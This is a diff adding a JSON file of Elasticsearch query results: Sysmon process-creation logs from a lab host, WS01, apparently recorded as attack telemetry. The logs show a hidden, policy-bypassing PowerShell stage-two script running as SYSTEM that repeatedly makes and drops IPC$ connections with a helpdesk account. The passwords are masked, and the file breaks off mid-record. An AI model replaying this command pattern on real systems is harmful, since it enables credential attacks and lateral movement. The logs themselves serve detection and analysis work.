@@ -1,0 +1,3425 @@
+{
+  "behaviour": "process_creation",
+  "index": "logs-windows.sysmon_operational-*",
+  "identifier": {
+    "field": "process.parent.entity_id",
+    "value": "{88E52A21-9771-6AE0-9F04-000000002600}",
+    "host": "ws01"
+  },
+  "alerts": [
+    "3d55443559f106a9d61eb3fe83cb556e2b3d9525d751cb4306e634d6644541ac"
+  ],
+  "queries": [
+    {
+      "query": {
+        "bool": {
+          "filter": [
+            {
+              "range": {
+                "@timestamp": {
+                  "gte": "2026-10-27T12:24:22.000Z",
+                  "lte": "2026-10-27T12:30:22.000Z"
+                }
+              }
+            },
+            {
+              "term": {
+                "host.name": "ws01"
+              }
+            },
+            {
+              "term": {
+                "event.code": "1"
+              }
+            },
+            {
+              "term": {
+                "process.parent.entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}"
+              }
+            }
+          ]
+        }
+      },
+      "window": {
+        "start": "2026-10-27T12:24:22.000Z",
+        "end": "2026-10-27T12:30:22.000Z"
+      },
+      "returned": 20,
+      "total": 20,
+      "relation": "eq"
+    }
+  ],
+  "returned": 20,
+  "truncated": false,
+  "sample": false,
+  "hits": [
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapME1p-x_",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 1744,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-9856-6AE0-A904-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "record_id": "1228184",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:25:58.389\nProcessGuid: {88E52A21-9856-6AE0-A904-000000002600}\nProcessId: 1744\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:25:58.389Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:25:59.501Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMFep2Dv",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /delete /y"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 4488,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-985E-6AE0-AB04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\""
+        },
+        "winlog": {
+          "record_id": "1228236",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:06.638\nProcessGuid: {88E52A21-985E-6AE0-AB04-000000002600}\nProcessId: 4488\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:06.638Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:18Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:07.517Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMFep2D7",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7068,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-985E-6AE0-AD04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228248",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:06.662\nProcessGuid: {88E52A21-985E-6AE0-AD04-000000002600}\nProcessId: 7068\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:06.662Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:18Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:07.517Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMFeqGAh",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "type": "filebeat",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /delete /y"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 6320,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-9866-6AE0-AF04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\""
+        },
+        "winlog": {
+          "record_id": "1228286",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:26:14.921\nProcessGuid: {88E52A21-9866-6AE0-AF04-000000002600}\nProcessId: 6320\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /delete /y\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:26:14.921Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:26:18Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:26:16.545Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9U4505TXapMFeqGAt",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "type": "filebeat",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7608,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-9866-6AE0-B104-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\WS01\\IPC$ /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228298",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
